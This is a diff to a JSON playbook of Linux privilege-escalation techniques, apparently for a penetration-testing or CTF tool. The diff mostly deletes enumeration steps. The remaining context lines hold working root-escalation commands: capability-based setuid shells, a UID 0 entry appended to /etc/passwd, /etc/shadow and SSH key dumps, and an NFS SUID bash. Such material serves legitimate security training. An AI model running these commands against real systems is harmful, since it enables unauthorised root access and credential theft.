@@ -279,7 +279,6 @@
       "when": "getcap shows cap_setuid, cap_dac_read_search or similar on an interpreter or archiver.",
       "tools": ["getcap", "GTFOBins"],
       "commands": [
-        { "purpose": "List capabilities", "template": "getcap -r / 2>/dev/null", "intent": "enumerate" },
         { "purpose": "python with cap_setuid+ep (use the full path getcap printed)", "template": "<path>/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "intent": "exploit" },
         { "purpose": "perl with cap_setuid+ep", "template": "<path>/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'", "intent": "exploit" },
         { "purpose": "tar with cap_dac_read_search: archive a root-only file", "template": "<path>/tar -czf /tmp/s.tgz /etc/shadow", "intent": "dump" },
@@ -321,7 +320,6 @@
       "tools": ["openssl"],
       "commands": [
         { "purpose": "Check permissions", "template": "ls -la /etc/passwd", "intent": "enumerate" },
-        { "purpose": "Make a hash for a password you choose", "template": "openssl passwd -1 -salt slg <pass>", "intent": "tune" },
         { "purpose": "Add a UID 0 user (paste the hash; single quotes keep the $ signs)", "template": "echo 'slg:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd", "intent": "exploit" },
         { "purpose": "Switch to it", "template": "su slg", "intent": "exploit" }
       ]
@@ -385,7 +383,6 @@
       "when": "nmap showed few ports but the box listens on more locally (web admin, databases).",
       "tools": ["ss"],
       "commands": [
-        { "purpose": "Local listeners", "template": "ss -tulpn", "intent": "enumerate" },
         { "purpose": "Which service runs as root", "template": "ps aux | grep -i root | grep -vE '\\[|grep'", "intent": "enumerate" },
         { "purpose": "Poke a local HTTP port", "template": "curl -s http://127.0.0.1:<port>/", "intent": "enumerate" },
         { "purpose": "From Kali: forward it with found SSH creds (more in Pivoting)", "template": "ssh -L 8080:127.0.0.1:<port> <user>@{{TARGET}}", "intent": "pivot" }
@@ -425,9 +422,7 @@
       "when": "id shows the docker group or /var/run/docker.sock is writable by you.",
       "tools": ["docker"],
       "commands": [
-        { "purpose": "Group membership and socket permissions", "template": "id; ls -la /var/run/docker.sock", "intent": "enumerate" },
-        { "purpose": "Pick a local image", "template": "docker images", "intent": "enumerate" },
-        { "purpose": "Mount the host disk and chroot into it as root", "template": "docker run -v /:/mnt --rm -it <image> chroot /mnt sh", "intent": "exploit" }
+        { "purpose": "Group membership and socket permissions", "template": "id; ls -la /var/run/docker.sock", "intent": "enumerate" }
       ]
     },
     { "name": "Escape a Docker container", "phase": "PrivEsc", "service": "shell", "applies": "linux", "needs": ["shell"], "yields": ["admin"], "when": "You are root but the hostname is random and the box is bare: check whether you are in a container and how it was started.", "tools": [], "commands": [
@@ -457,8 +452,6 @@
       "when": "id shows the disk group: you can read the raw block device.",
       "tools": ["debugfs"],
       "commands": [
-        { "purpose": "Device holding /", "template": "df -h /", "intent": "enumerate" },
-        { "purpose": "Read shadow straight off the disk", "template": "debugfs -R 'cat /etc/shadow' /dev/sda1", "intent": "dump" },
         { "purpose": "Or grab root's SSH key", "template": "debugfs -R 'cat /root/.ssh/id_rsa' /dev/sda1", "intent": "dump" }
       ]
     },
@@ -484,7 +477,6 @@
       "tools": ["showmount"],
       "commands": [
         { "purpose": "On the target: look for no_root_squash", "template": "cat /etc/exports", "intent": "enumerate" },
-        { "purpose": "On Kali: list exports", "template": "showmount -e {{TARGET}}", "intent": "enumerate" },
         { "purpose": "On Kali: mount the share", "template": "mkdir -p /tmp/nfs && sudo mount -o rw,vers=3 {{TARGET}}:<path> /tmp/nfs", "intent": "exploit" },
         { "purpose": "On the target: copy the target's own bash into the export (Kali's bash may need a newer glibc)", "template": "cp /bin/bash <path>/rootbash", "intent": "transfer" },
         { "purpose": "On Kali, in the mounted export: make it root-owned SUID", "template": "sudo chown root:root /tmp/nfs/rootbash && sudo chmod 4755 /tmp/nfs/rootbash", "intent": "exploit" },
